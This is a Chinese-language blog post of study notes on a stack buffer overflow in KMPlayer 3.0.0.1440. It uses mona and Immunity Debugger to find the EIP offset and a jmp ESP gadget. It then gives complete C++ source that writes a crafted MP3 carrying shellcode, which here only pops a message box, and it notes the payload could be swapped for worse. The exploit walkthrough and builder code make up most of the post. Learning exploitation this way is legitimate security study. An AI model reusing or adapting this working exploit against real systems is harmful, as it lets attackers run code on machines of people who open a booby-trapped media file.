\-\-- layout: post title: 你知道聽歌也會中毒嗎？初探BOF攻擊、KMPlayer
MP3漏洞利用（附贈ADR的歌聲、Source Code） date:
\'2015-05-11T04:00:00.001-07:00\' author: 聖豪馬 tags: - BOF - Stack -
CPlus - ASM modified\_time: \'2015-06-01T04:43:40.376-07:00\' thumbnail:
http://1.bp.blogspot.com/-2YIGu6v9844/VVCNyvZxY5I/AAAAAAAAGU8/Y-PvEbqR8zc/s72-c/%E6%9C%AA%E5%91%BD%E5%90%8D.png
blogger\_id:
tag:blogger.com,1999:blog-1335849442109808564.post-5326983662503521568
blogger\_orig\_url:
http://helloadr.blogspot.com/2015/05/bofkmplayer-mp3adr.html \-\--
此篇內容接續著前幾篇Blog文：\

-   [從PE架構淺談純組語撈出當前進程的映像路徑 ](http://helloadr.blogspot.tw/2015/04/windowspeasmcepe.html)
-   [從PE架構到模組架構到暴力列舉模組找模組位置（如Kernel32.dll） ](http://helloadr.blogspot.tw/2015/04/windowspeasmcepekernel32dll.html)
-   [純組語手幹Dll
    Header解析外導函數表撈出函數地址（如LoadLibraryA動態地址）](http://helloadr.blogspot.tw/2015/05/windowspeasmdll-headerapiloadlibrarya.html)

參考文獻\

1.  [緩衝區溢位攻擊：第四章 -
    真槍實彈 ](http://securityalley.blogspot.tw/2014/09/blog-post.html)

我知道這個標題有點聳動，其實沒到那麼可怕啦XD\
呼\...我終於看到第四章節了T\^T，一樣是雷雷的筆記文章，另外，這篇文章特別感謝Orange大神在我找不到BUG在哪的時候伸出援手替我解圍啊啊啊啊啊\
\
這邊要寫的筆記是[緩衝區溢位攻擊：第四章 -
真槍實彈](http://securityalley.blogspot.tw/2014/09/blog-post.html)文中提及的KMPlayer
1440版中關於MP3的漏洞，在KMPlayer
1440版中針對MP3音樂檔案文件做解析時會有存在Buffer
Overflow（BOF）的問題，以下紀錄我自己在探究這個漏洞利用、練習時的逐步思路跟概念，到最後寫出一個可以利用漏洞來引發攻擊者想做的惡意事情，卻是透過MP3音樂文件做觸發。\
\
如果正在看文章的你還沒有下載KMPlayer 1440有漏洞的版本，可以在這裡下載：\
[KMPlayer 3.0.0.1440 萬能影音播放器 綠色免安裝
中文版&110套面板](http://ck-com.blogspot.tw/2011/07/kmplayer-3001440.html)\
（我是下載免安裝版，我也是在這裡下載的XD）\
\
首先，得知MP3文件在解析時會有存在BOF問題，可以先用mona引擎替我們生產一組Pattern來做測試，看看實際在哪個點引發出錯進而分析如何做攻擊，開啟Immunity
Debugger下命令：!mona pattern\_create 10000\
\
它會替我們生產一個10000個字長度的Pattern，另外，\
特別記得在VISTA、WIN7除錯器記得要以工作管理員運行\...XD，剛剛被雷過\

::: {.separator style="clear: both; text-align: center;"}
[![](http://1.bp.blogspot.com/-2YIGu6v9844/VVCNyvZxY5I/AAAAAAAAGU8/Y-PvEbqR8zc/s640/%E6%9C%AA%E5%91%BD%E5%90%8D.png){width="640"
height="140"}](http://1.bp.blogspot.com/-2YIGu6v9844/VVCNyvZxY5I/AAAAAAAAGU8/Y-PvEbqR8zc/s1600/%E6%9C%AA%E5%91%BD%E5%90%8D.png)
:::

 接著可以在Immunity Debugger底下發現一個Pattern.txt文件：\

::: {.separator style="clear: both; text-align: center;"}
[![](http://3.bp.blogspot.com/-GnZQwDxAuL4/VVCOoZ7bRUI/AAAAAAAAGVE/gEF064Ol0i0/s640/%E6%9C%AA%E5%91%BD%E5%90%8D.png){width="640"
height="460"}](http://3.bp.blogspot.com/-GnZQwDxAuL4/VVCOoZ7bRUI/AAAAAAAAGVE/gEF064Ol0i0/s1600/%E6%9C%AA%E5%91%BD%E5%90%8D.png)
:::

 接著可以看到mona替我們生產出一組Pattern長度為10000長度的文字，將ASCII段內的文字複製起來，另外以記事本開新檔案將ASCII段內的所有文字複製後保存進去新的文字檔，命名為adr.mp3\

::: {.separator style="clear: both; text-align: center;"}
[![](http://1.bp.blogspot.com/-WfyZg6X97A4/VVCP440HeaI/AAAAAAAAGVQ/oGs7PxPpgag/s640/%E6%9C%AA%E5%91%BD%E5%90%8D.png){width="640"
height="270"}](http://1.bp.blogspot.com/-WfyZg6X97A4/VVCP440HeaI/AAAAAAAAGVQ/oGs7PxPpgag/s1600/%E6%9C%AA%E5%91%BD%E5%90%8D.png)
:::

 接著如果你把adr.mp3丟給KMPlayer.exe執行，會發現狀況如下：\

::: {.separator style="clear: both; text-align: center;"}
[![](http://3.bp.blogspot.com/-8if55k2vQTs/VVCQLt1Ut4I/AAAAAAAAGVY/8WE7XVLLOSs/s640/%E6%9C%AA%E5%91%BD%E5%90%8D.png){width="640"
height="236"}](http://3.bp.blogspot.com/-8if55k2vQTs/VVCQLt1Ut4I/AAAAAAAAGVY/8WE7XVLLOSs/s1600/%E6%9C%AA%E5%91%BD%E5%90%8D.png)
:::

 原本應該是正常解析MP3並且播放音樂的行為，KMPlayer卻意外的崩潰了！這代表著可能在adr.mp3內的文字有哪部份文字會覆蓋掉EIP執行，導致意外崩潰\
\
接著我們開啟Immunity
Debugger（原文是用WinDGB，不過我沒有安裝XD；而且大部分會用到的功能都在Immunity上完成，用習慣會蠻喜歡的）然後開啟KMPlayer.exe並且給予參數是adr.mp3，看看KMPlayer在載入adr.mp3到底在哪個記憶體點上造成崩潰\

::: {.separator style="clear: both; text-align: center;"}
[![](http://1.bp.blogspot.com/-9BRCo1z_zf4/VVCRPRQSlcI/AAAAAAAAGVk/RUO490r6lwE/s640/%E6%9C%AA%E5%91%BD%E5%90%8D.png){width="640"
height="384"}](http://1.bp.blogspot.com/-9BRCo1z_zf4/VVCRPRQSlcI/AAAAAAAAGVk/RUO490r6lwE/s1600/%E6%9C%AA%E5%91%BD%E5%90%8D.png)
:::

 在來就是不斷的F9一路F9下去囉（途中還可能會看到一些奇怪的訊息，基本上是KMPlayer本身有做一些混淆的動作導致Immunity
Debugger無法識別導致的，按確定即可）直到發生以下狀況：\

::: {.separator style="clear: both; text-align: center;"}
[![](http://3.bp.blogspot.com/-OW2o_Q191yg/VVCSZ3jDIqI/AAAAAAAAGVw/J7C3ie8rsG0/s640/%E6%9C%AA%E5%91%BD%E5%90%8D.png){width="640"
height="412"}](http://3.bp.blogspot.com/-OW2o_Q191yg/VVCSZ3jDIqI/AAAAAAAAGVw/J7C3ie8rsG0/s1600/%E6%9C%AA%E5%91%BD%E5%90%8D.png)
:::

咦，會發現F9到這邊就卡住不能繼續F9下去了，ESP指向資料\...這不就是我們剛剛在adr.mp3內存放的Pattern嗎XD，看來我們很成功的讓adr.mp3內的Pattern覆蓋入Stack了，而仔細看一下Stack上最高位置0x0438F038開始都是很規律的Pattern內文字的ASCII
Code。\
\
再仔細看一下EIP：0x31684630，也就是我們Pattern不知道哪段文字覆蓋到EIP，導致現在EIP執行到此EIP被設置為了0x31684630而無法正常繼續執行下去，接著我們就是想辦法找到0x31684630是哪一段文字，我們就能夠操控EIP了！\
\
到此，我們可以利用mona內一個很方便的指令，\
使用!mona pattern\_offset 31684630，執行如下：\

::: {.separator style="clear: both; text-align: center;"}
[![](http://2.bp.blogspot.com/-CbIgK6voBo4/VVCa5HNMRwI/AAAAAAAAGV8/MEEHicCsi0c/s640/%E6%9C%AA%E5%91%BD%E5%90%8D.png){width="640"
height="188"}](http://2.bp.blogspot.com/-CbIgK6voBo4/VVCa5HNMRwI/AAAAAAAAGV8/MEEHicCsi0c/s1600/%E6%9C%AA%E5%91%BD%E5%90%8D.png)
:::

 mona可以直接替我們計算出原來EIP這個點被覆蓋的Offset是4112的點上！\
\
接著我們可以在看一下我們附蓋完EIP後，Stack最高位置0x0438F038內保存的ASCII
Code之值為0x68463368，接著下!mona pattern\_offset 68463368\

::: {.separator style="clear: both; text-align: center;"}
[![](http://4.bp.blogspot.com/-t7EBqEenTdY/VVCbvDbtk2I/AAAAAAAAGWE/L3fDUohdFRg/s640/%E6%9C%AA%E5%91%BD%E5%90%8D.png){width="640"
height="156"}](http://4.bp.blogspot.com/-t7EBqEenTdY/VVCbvDbtk2I/AAAAAAAAGWE/L3fDUohdFRg/s1600/%E6%9C%AA%E5%91%BD%E5%90%8D.png)
:::

我們可以得知Stack最高位置（0x0438F038）的Offset為4120\
\
我們可以來釐清一下目前這個adr.mp3被載入狀況：\

1.  第0\~4111個字為Buffer
2.  第4112\~4115個字保存EIP地址
3.  第4116\~4119為四個不重要的字
4.  第4120個字開始就是Stack資料

ok，知道大致上記憶體載入狀況為這樣之後，我們現在可以知道的是我們只能控制EIP，但我們想藉由控制EIP來指向我們自己寫的惡意程式碼，這樣才能達到程式去執行我們的惡意程式碼來做壞事，但是我們所有惡意程式碼只能被放在Stack上。\
\
那我們該如何操控EIP來跑到惡意程式碼呢？我們可以想辦法找找進程內有沒有可以jmp
ESP或者call
ESP這種指令，只要我們能把EIP設置到該指令之上，就可以引導執行緒去執行我們惡意程式碼囉！\
\
在mona內有封裝一個很方便的命令這麼下，可以取得所有對ESP的跳躍動作：\
!mona jmp -r ESP\
\
不過這個命令下了之後會連Windows
API上的相關資訊也列出來，但是未來可能Windows
API會有模組改版、偏移修正、\...等系統改版，為了穩定性而言一般不建議在Shellcode包含系統相關位址（對shellcode相容性並不好）可以改這麼下命令，就可以只列出當前進程相關的資訊了：!mona
jmp -o -r ESP\

::: {.separator style="clear: both; text-align: center;"}
[![](http://4.bp.blogspot.com/-z4tbgApL2Sg/VVCezqtsWwI/AAAAAAAAGWQ/zu0teYfg2-Y/s640/%E6%9C%AA%E5%91%BD%E5%90%8D.png){width="640"
height="158"}](http://4.bp.blogspot.com/-z4tbgApL2Sg/VVCezqtsWwI/AAAAAAAAGWQ/zu0teYfg2-Y/s1600/%E6%9C%AA%E5%91%BD%E5%90%8D.png)
:::

 這邊會列出所有mona在當前進程（KMPlayer.exe）內搜尋到的進程相關的指令，有哪些包含了Jmp
ESP的動作，可以看到mona列出了很多，不過如果是DLL上的不建議使用（首先你要先確定在這個Buffer被載入前，這個DLL是否已經先被載入？如果沒有，可能會導致Shellcode執行失敗）\
\
這邊我挑選了
0x0049BDDF，這個位置在KMPlayer.exe的主程式模組上，基本上程式一被開啟這個位置就存在了，我們不用擔心會不會這個地址不存在的問題；再來相容性也比較好，挑這個位置當跳板，基本上我們要寫的Shellcode是針對這支程式的，偏移依靠這支程式的模組也比較不會遇到系統API等載入位置亂跑的問題。\
\
接下來惡意程式碼部份，這邊做DEMO選了黑橘大神給的Shellcode，[Allwin
MessageBoxA
Shellcode](http://shell-storm.org/shellcode/files/shellcode-648.php)，這個Shellcode被執行後會跳出一個MessageBoxA的訊息。\
\
有了以上所有資訊後，\
可以用Dev C++寫一支簡單的C++程式來幫我們拼裝出新版本的塞Shellcode
mp3囉！\
程式碼如下\
\

``` {.brush:cpp;}
#include 
#include 
#include 
using namespace std;
/*
Title: Allwin MessageBoxA Shellcode
Date: 2010-06-11
Author: RubberDuck
Web: http://bflow.security-portal.cz
Tested on: Win 2k, Win 2003, Win XP Home SP2/SP3 CZ/ENG (32), Win Vista (32)/(64), Win 7 (32)/(64), Win 2k8 (32)
Thanks to: kernelhunter, Lodus, Vrtule, Mato, cm3l1k1, eat, st1gd3r and others
*/
char code[] =
"\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B"
"\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9"
"\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C"
"\x02\x2C\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0"
"\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B"
"\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72"
"\x34\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03"
"\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47"
"\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F"
"\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72"
"\x65\x75\xE2\x49\x8B\x72\x24\x03\xF3\x66"
"\x8B\x0C\x4E\x8B\x72\x1C\x03\xF3\x8B\x14"
"\x8E\x03\xD3\x52\x33\xFF\x57\x68\x61\x72"
"\x79\x41\x68\x4C\x69\x62\x72\x68\x4C\x6F"
"\x61\x64\x54\x53\xFF\xD2\x68\x33\x32\x01"
"\x01\x66\x89\x7C\x24\x02\x68\x75\x73\x65"
"\x72\x54\xFF\xD0\x68\x6F\x78\x41\x01\x8B"
"\xDF\x88\x5C\x24\x03\x68\x61\x67\x65\x42"
"\x68\x4D\x65\x73\x73\x54\x50\xFF\x54\x24"
"\x2C\x57\x68\x4F\x5F\x6F\x21\x8B\xDC\x57"
"\x53\x53\x57\xFF\xD0\x68\x65\x73\x73\x01"
"\x8B\xDF\x88\x5C\x24\x03\x68\x50\x72\x6F"
"\x63\x68\x45\x78\x69\x74\x54\xFF\x74\x24"
"\x40\xFF\x54\x24\x40\x57\xFF\xD0";

int main(int argc, char **argv) {
    string filename("ADR的歌聲.mp3");
    string junk(4112, 'A');
    string eip("\xDF\xBD\x49\x00"); // 0x0049BDDF - Jump ESP (4112 ~ 4115) 
    string padding("ADR!");         // offset 4116 ~ 4119 (四個字可隨便塞) 
    string shellcode(code);         // offset 4120 ~ ... 把shellcode塞到stack上 
    ofstream fout(filename.c_str(), ios::binary);
    fout << junk;
    fout.write(eip.c_str(), 4);
    fout << padding  << shellcode;
    cout << "順利產生檔案 " << filename << "\n";
}
```

編譯結果如下：\

::: {.separator style="clear: both; text-align: center;"}
[![](http://1.bp.blogspot.com/-eMPXT6CTsgQ/VVCiBUPUI_I/AAAAAAAAGWc/Zw2M3INaAtw/s640/%E6%9C%AA%E5%91%BD%E5%90%8D.png){width="640"
height="324"}](http://1.bp.blogspot.com/-eMPXT6CTsgQ/VVCiBUPUI_I/AAAAAAAAGWc/Zw2M3INaAtw/s1600/%E6%9C%AA%E5%91%BD%E5%90%8D.png)
:::

 接著把ADR的歌聲.mp3丟給KMPlayer.exe播放看看ADR的歌聲如何：\
\

::: {.separator style="clear: both; text-align: center;"}
[![](http://4.bp.blogspot.com/--7XBjsk3Oys/VVCiXD2UeOI/AAAAAAAAGWk/xSHdXEQltik/s640/%E6%9C%AA%E5%91%BD%E5%90%8D.png){width="640"
height="432"}](http://4.bp.blogspot.com/--7XBjsk3Oys/VVCiXD2UeOI/AAAAAAAAGWk/xSHdXEQltik/s1600/%E6%9C%AA%E5%91%BD%E5%90%8D.png)
:::

成功囉！塞了shellcode之後的ADR的歌聲.mp3成功引發KMPlayer的漏洞，執行了我們的惡意程式碼跳出了訊息視窗（正常來說播放MP3不該有這個視窗），假設我們把shellcode換成其他壞壞髒髒的事情，後果不堪設想XD\
\
最後，第一次玩BOF塞shellcode大概摸到這樣，其實BOF還蠻好玩的XD\
如果弄不太出來，可以參考我寫好的Source
Code在GitHub上，還有我寫好的ADR的歌聲XD\
[GitHub：Attack-KMPlayer\_1440](https://github.com/aaaddress1/Dev-C-Homework/tree/master/Attack-KMPlayer_1440)
